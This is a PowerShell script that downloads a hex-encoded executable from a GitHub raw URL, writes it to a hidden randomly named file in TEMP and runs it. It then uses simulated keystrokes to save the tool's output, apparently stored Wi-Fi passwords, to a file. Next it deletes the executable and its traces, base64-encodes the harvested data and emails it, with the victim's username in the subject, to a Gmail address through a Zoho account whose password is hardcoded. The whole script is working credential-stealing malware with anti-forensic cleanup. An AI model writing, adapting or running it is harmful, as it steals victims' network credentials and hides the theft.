function New-MemoryAttachment {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Data,
        
        [Parameter(Mandatory=$false)]
        [string]$FileName = "ani.txt",
        
        # FIX: Removed the "= $true". Switches are false by default.
        [switch]$Obfuscate 
    )

    try {
        $contentToStream = $Data
        if ($Obfuscate) {
            $bytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
            $contentToStream = [System.Convert]::ToBase64String($bytes)
        }

        $ms = New-Object System.IO.MemoryStream
        $writer = New-Object System.IO.StreamWriter($ms)
        $writer.Write($contentToStream)
        $writer.Flush()
        $ms.Position = 0

        return New-Object Net.Mail.Attachment($ms, $FileName)
    }
    catch {
        Write-Error "Failed to create memory attachment: $($_.Exception.Message)"
        return $null
    }
}

function Send-ZohoEmail {
    param (
        [string]$FromEmail = "zqrvstef0rc5edk@zohomail.com",
        [string]$ToEmail = "srve650@gmail.com",
        [string]$Subject,
        [string]$Body = "Hello, this is a test email with an attachment.",
        [PSObject[]]$Attachments = @(), # MUST BE PSObject
        [string]$SmtpServer = "smtp.zoho.com",
        [int]$Port = 587,
        [string]$Username = "zqrvstef0rc5edk@zohomail.com",
        [string]$Password = "LHjzKTbzDApt"
    )

    $mailMessage = New-Object System.Net.Mail.MailMessage
    $mailMessage.From = $FromEmail
    $mailMessage.To.Add($ToEmail)
    $mailMessage.Subject = $Subject
    $mailMessage.Body = $Body

    foreach ($item in $Attachments) {
        if ($null -eq $item) { continue }
        
        # Logic to distinguish between Object and File Path
        if ($item.GetType().FullName -like "*Attachment*") {
            $mailMessage.Attachments.Add($item)
        }
        elseif ($item -is [string] -and (Test-Path $item)) {
            $mailMessage.Attachments.Add((New-Object System.Net.Mail.Attachment($item)))
        }
    }

    $smtpClient = New-Object Net.Mail.SmtpClient($SmtpServer, $Port)
    $smtpClient.EnableSsl = $true
    $smtpClient.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)

    try {
        $smtpClient.Send($mailMessage)
        Write-Host "Success!" -ForegroundColor Green
    } finally {
        $mailMessage.Dispose()
        $smtpClient.Dispose()
    }
}

# Run WBPV 
# 1. Download and Prepare
$url = "https://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/example.txt"
$tempPath = [System.IO.Path]::Combine($env:TEMP, "example.txt")
Invoke-WebRequest -Uri $url -OutFile $tempPath

$hexString = Get-Content -Path $tempPath -Raw
$bytes = [byte[]]::new($hexString.Length / 2)
for ($i = 0; $i -lt $hexString.Length; $i += 2) {
    $bytes[$i / 2] = [convert]::ToByte($hexString.Substring($i, 2), 16)
}

# 1. Create and Start the Random EXE
$randName = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
$tempExePath = Join-Path $env:TEMP "$randName.exe"
[System.IO.File]::WriteAllBytes($tempExePath, $bytes)
(Get-Item $tempExePath).Attributes = 'Hidden'

# Use -PassThru so we can track the exact Process ID
$processObj = Start-Process $tempExePath -PassThru 

# ... [Your SendKeys Logic Here] ...
$outputFilePath = "$env:TEMP\data.txt"

Start-Sleep -Seconds 2 
Add-Type -AssemblyName System.Windows.Forms

[System.Windows.Forms.SendKeys]::SendWait("^(a)")
Start-Sleep -Milliseconds 500
[System.Windows.Forms.SendKeys]::SendWait("^(s)")
Start-Sleep -Milliseconds 1000

[System.Windows.Forms.SendKeys]::SendWait("$outputFilePath")
Start-Sleep -Milliseconds 500
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")

Start-Sleep -Seconds 2 # Wait for the save to finish

# 2. FORCE CLEANUP
try {
    if ($processObj) {
        # Stop the process by its specific ID
        Stop-Process -Id $processObj.Id -Force -ErrorAction SilentlyContinue
        
        # Wait a split second for Windows to release the file lock
        Start-Sleep -Milliseconds 500
        
        # Release the PowerShell handle on the process object
        $processObj.Dispose() 
    }
} catch {
    Write-Host "Process already closed."
}

# 3. DELETE THE EXE
if (Test-Path $tempExePath) {
    # The 'Force' is needed because we set the attribute to 'Hidden'
    Remove-Item $tempExePath -Force -ErrorAction SilentlyContinue
    Write-Host "Success: $tempExePath has been removed." -ForegroundColor Green
}

# 4. DELETE THE HEX TEXT FILE
if (Test-Path $tempPath) {
    Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
}


## Ensure TLS 1.2 for modern SMTP servers
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

if (Test-Path $outputFilePath) {
    $rawData = Get-Content $outputFilePath -Raw
    
    # CALLING FIX: We just use -Obfuscate. We do NOT add $true after it.
    $attachment = New-MemoryAttachment -Data $rawData -FileName "anihan.txt" -Obfuscate

    if ($null -ne $attachment) {
        $currentDate = Get-Date -Format 'yyyy-MM-dd HH:mm'
        $subject = "$env:USERNAME: Ang pag-ani sa bukirin - $currentDate"
        
        try {
            # Send the object inside an array
            Send-ZohoEmail -Subject $subject -Attachments @($attachment)
        }
        catch {
            # This captures the "Failure sending mail" and explains WHY
            Write-Host "SMTP Error: $($_.Exception.Message)" -ForegroundColor Red
            Write-Host "Check: 1. App Password? 2. Port 587 Blocked? 3. Internet connection?" -ForegroundColor Yellow
        }
        finally {
            $attachment.Dispose()
            Remove-Item $outputFilePath -Force
            Write-Host "Cleanup Complete." -ForegroundColor Gray
        }
    }
}
else {
    Write-Host "Error: Save-As operation failed. Data file not found." -ForegroundColor Red
}